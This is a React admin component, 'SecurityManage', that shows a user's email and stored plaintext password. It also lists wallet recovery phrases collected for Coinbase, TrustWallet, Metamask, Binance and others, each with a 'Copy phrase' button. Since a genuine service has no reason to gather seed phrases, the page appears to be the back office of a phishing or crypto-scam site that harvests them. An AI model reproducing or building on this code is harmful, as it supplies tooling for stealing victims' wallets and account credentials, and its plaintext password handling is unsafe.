import { styled } from "styled-components";
import { SettingsFormStandard } from "../../../styled/forms/SettingsFormStandard";
import {
  FormButton,
  OutlinedIconBoxWithButton,
  PasswordBox,
  TextFieldOutlined,
} from "../../../styled/input/Input";
import { useEffect, useState } from "react";
import Toast from "../../../hooks/Toast";

const SecurityManage = ({ user }) => {
  // toast
  const [openToast, setOpenToast] = useState(false);
  const [toastMessage, setToastMessage] = useState(" ");
  const [toastType, setToastType] = useState(undefined);

  const { userDetails, setUserDetails } = user;

  const { phrases } = userDetails;

  const wallets = {
    Coinbase: {
      name: "Coinbase",
      icon: "./assets/wallets/coinbase.svg",
    },
    "Coinbase One": {
      name: "Coinbase One",
      icon: "./assets/wallets/coinbase-one.svg",
    },
    TrustWallet: {
      name: "TrustWallet",
      icon: "./assets/wallets/trust.svg",
    },
    Gemini: {
      name: "Gemini",
      icon: "./assets/wallets/gemini.svg",
    },
    Metamask: {
      name: "Metamask",
      icon: "./assets/wallets/metamask.svg",
    },
    Uniswap: {
      name: "Uniswap",
      icon: "./assets/wallets/uniswap.svg",
    },
    Binance: {
      name: "Binance",
      icon: "./assets/wallets/binance.svg",
    },
  };

  // useEffect(() => {
  //   console.log(Object.values(phrases));
  // }, []);

  function copyValue(value, type) {
    navigator.clipboard.writeText(value);
    setToastType("success");
    setToastMessage("Copied " + type);
    setOpenToast(true);
  }

  return (
    <>
      {openToast && (
        <Toast
          open={{ openToast, setOpenToast }}
          message={toastMessage}
          type={toastType}
        />
      )}

      <SecuritySettingsStandard>
        <SettingsFormStandard>
          <div className="form">
            <div className="section">
              <div className="section_intro">
                <p className="label">Security</p>
                <p className="subtext">
                  To perform actions like change user password, change user
                  email or delete account, you have to log in to the user's
                  account. The user's details are shown below:
                </p>
              </div>

              <div className="form_item">
                <p className="label">User Email</p>
                <div className="content">
                  <TextFieldOutlined className="variant">
                    <input
                      type="email"
                      placeholder={userDetails?.email}
                      value={userDetails?.email}
                      disabled
                      // onChange={handleEmailAddress}
                    />
                  </TextFieldOutlined>
                </div>
              </div>

              <div className="form_item">
                <p className="label">User password</p>
                <div className="content">
                  <PasswordBox className="variant">
                    <input
                      type="text"
                      placeholder={userDetails?.userPass}
                      value={userDetails?.userPass}
                      disabled
                    />
                  </PasswordBox>
                </div>
              </div>

              {/* <div className="form_item">
                <p className="label">New password</p>
                <div className="content">
                  <PasswordBox className="variant">
                    <input
                      type="text"
                      placeholder="Password (Min. of 6 characters)"
                    />
                  </PasswordBox>
                </div>
              </div> */}

              {/* <div className="form_item">
                <p className="label">Confirm new password</p>
                <div className="content">
                  <PasswordBox className="variant">
                    <input type="text" placeholder="Retype your password" />
                  </PasswordBox>
                </div>
              </div> */}

              {/* <FormButton>
                <p>Save</p>
              </FormButton> */}
            </div>

            {Object.values(phrases).length > 0 && (
              <div className="section">
                <div className="section_intro">
                  <p className="title">Wallet connect</p>
                  <p className="subtext">Manage user's connected wallets.</p>
                </div>

                <div className="form_item">
                  <p className="label">Phrases</p>
                  {Object.values(
                    Object.values(phrases).map((phrase) => (
                      <div className="address">
                        <div className="content">
                          <OutlinedIconBoxWithButton className="variant">
                            <div className="left">
                              <img
                                src={wallets[phrase?.name]?.icon}
                                style={{ marginLeft: "12px" }}
                                alt=""
                              />
                              <input
                                type="text"
                                placeholder={phrase?.phrase}
                                disabled
                              />
                            </div>
                            <button
                              onClick={() =>
                                copyValue(
                                  phrase?.phrase,
                                  ` ${phrase?.name} Phrase`
                                )
                              }
                            >
                              Copy phrase
                            </button>
                          </OutlinedIconBoxWithButton>
                        </div>
                      </div>
                    ))
                  )}
                </div>

                <br />
              </div>
            )}

            {/* <div className="section">
              <div className="section_intro">
                <p className="title">Delete account</p>
                <p className="subtext">
                  Once you delete your account, there is no going back. Please
                  be certain.
                </p>
              </div>

              <div className="form_item">
                <div className="content">
                  <button className="delete_button">Delete your account</button>
                </div>
              </div>
            </div> */}
          </div>
        </SettingsFormStandard>
      </SecuritySettingsStandard>
    </>
  );
};

const SecuritySettingsStandard = styled.div`
  .form_item {
    margin-top: 24px;
  }

  .multi_factor {
    margin-top: 48px;
  }
`;

export default SecurityManage;
